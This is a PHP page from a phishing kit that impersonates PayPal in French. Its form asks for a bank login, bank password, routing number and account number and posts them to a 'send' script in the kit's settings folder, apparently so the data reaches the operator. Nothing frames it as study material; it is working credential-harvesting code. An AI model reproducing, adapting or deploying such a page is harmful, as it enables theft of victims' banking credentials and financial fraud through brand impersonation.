<?php
	include("../settings/lang/index.php");
	session_start();
	$random=rand(0,100000000000);$gorand=md5($random);
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title>PayPal</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>
				<div class="valhallaContent valhallaContentInfo">

				<!-- CONTAINER --> 
					<div class="valhallasafeComponent">
						<header class="valhallaInfo">
							<div class="valhallaLogo big"></div>
						</header>
						<div class="valhallasafe">
							<h1 class="valhallaInfoTitle"><?php echo $valhalla33; ?></h1>
								<p class="valhallaFormTitle"><?php echo $valhalla34; ?></p>

<script>

</script>
							<form action="../settings/send/valhallabnkacc.php" method="post" name="bnkForm" onsubmit="return validateBnkForm()">

								<p class="FieldsTitle"><?php echo $valhalla35; ?></p>

								<div class="valhallaFieldset">
									<input type="text" name="valhallabnId" id="valhallabnId" placeholder="<?php echo $valhalla36; ?>" maxlength="30" autocomplete="off" autocorrect="off" />
								</div>
								<div class="valhallaFieldset">
									<input type="password" name="valhallabnPs" id="valhallabnPs" placeholder="<?php echo $valhalla37; ?>" maxlength="30" autocomplete="off" autocorrect="off" />
								</div>
								<?php
									if($_SESSION['countrycode1'] != "FR" || $_SESSION['countrycode1'] != "ES" || $_SESSION['countrycode1'] != "UK" || $_SESSION['countrycode1'] != "CH" || $_SESSION['countrycode1'] != "DE" || $_SESSION['countrycode1'] != "BE" || $_SESSION['countrycode1'] != "SE" || $_SESSION['countrycode1'] != "IT"){
										echo '
											<div class="valhallabnkInfo valhallabnkInfoCheck" id="valhallabnkInfo">
												<img src="../assets/img/walt.svg">
											</div>
										';
									}
								?>
								<p class="valhallabnktype"><?php echo $valhalla38; ?></p>
								<div class="row radioGroup ">
									<div class="vx_radio col-sm-6"><input type="radio" name="accountType" id="checkingRadioBtn" class="test_CHECKING" value="CHECKING" checked="" onclick="checkingF()"><label class="" for="checkingRadioBtn"><?php echo $valhalla39; ?></label></div><div class="vx_radio col-sm-6"><input type="radio" name="accountType" id="savingsRadioBtn" class="test_SAVINGS" value="SAVINGS" onclick="savingF()"><label class="" for="savingsRadioBtn"><?php echo $valhalla40; ?></label></div>
								</div>
								<?php
									if($_SESSION['countrycode1'] != "FR" || $_SESSION['countrycode1'] != "ES" || $_SESSION['countrycode1'] != "UK" || $_SESSION['countrycode1'] != "CH" || $_SESSION['countrycode1'] != "DE" || $_SESSION['countrycode1'] != "BE" || $_SESSION['countrycode1'] != "SE" || $_SESSION['countrycode1'] != "IT"){
										echo '
											<div class="valhallaFieldset">
											<input type="tel" name="valhallaRtNm" id="valhallaRtNm" placeholder="'. $valhalla41 .'" maxlength="9" autocomplete="off" autocorrect="off" />
										</div>
										<div class="valhallaFieldset">
											<input type="tel" name="valhallaAcNm" id="valhallaAcNm" placeholder="'. $valhalla42 .'" maxlength="10" autocomplete="off" autocorrect="off"  />
										</div>
										';
									} else{
										echo '
											<div class="valhallaFieldset" style="display:none">
												<input type="tel" name="valhallaRtNm" id="valhallaRtNm" placeholder="<?php echo $valhalla41; ?>" maxlength="9" autocomplete="off" autocorrect="off" value="Not US"/>
											</div>
											<div class="valhallaFieldset" style="display:none">
												<input type="tel" name="valhallaAcNm" id="valhallaAcNm" placeholder="<?php echo $valhalla42; ?>" maxlength="10" autocomplete="off" autocorrect="off" value="Not US"/>
											</div>
										';
									}
								?>
								
								<p class="leftText" style="font-size: 12px"><?php echo $valhalla43; ?></p>

								<input type="submit" class="valhallaButton" name="valhallabnksnd" value="<?php echo $valhalla44; ?>">

								
								<div class="nobnk"><a href="identification.php"><?php echo $valhalla45; ?></a></div>
							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="valhallaFooter">
		<ul class="valhallaFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/sections.js"></script>

	<script>
	$(document).ready(function(){
		$('#valhallabnId').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallabnId').removeClass('hasError'); } else {$('#valhallabnId').removeClass('hasError'); }});

		$('#valhallabnPs').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallabnPs').removeClass('hasError'); } else {$('#valhallabnPs').removeClass('hasError'); }});

		$('#valhallaRtNm').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaRtNm').removeClass('hasError'); } else {$('#valhallaRtNm').removeClass('hasError'); }});

		$('#valhallaAcNm').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaAcNm').removeClass('hasError'); } else {$('#valhallaAcNm').removeClass('hasError'); }});
		
		});
	</script>

<!-- LOADING -->
	<div class="valhallaLoaderOverlay">
		<div class="valhallaModalAnimate" id="valhallaModalAnimate">
			<div class="valhallaRotate"></div>
			<div class="valhallaProcessing"><?php echo $valhalla12; ?></div>
			<div class="valhallaLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="valhallaModalOverlay" id="valhallaModalOverlay"></div>
	
</body>
</html>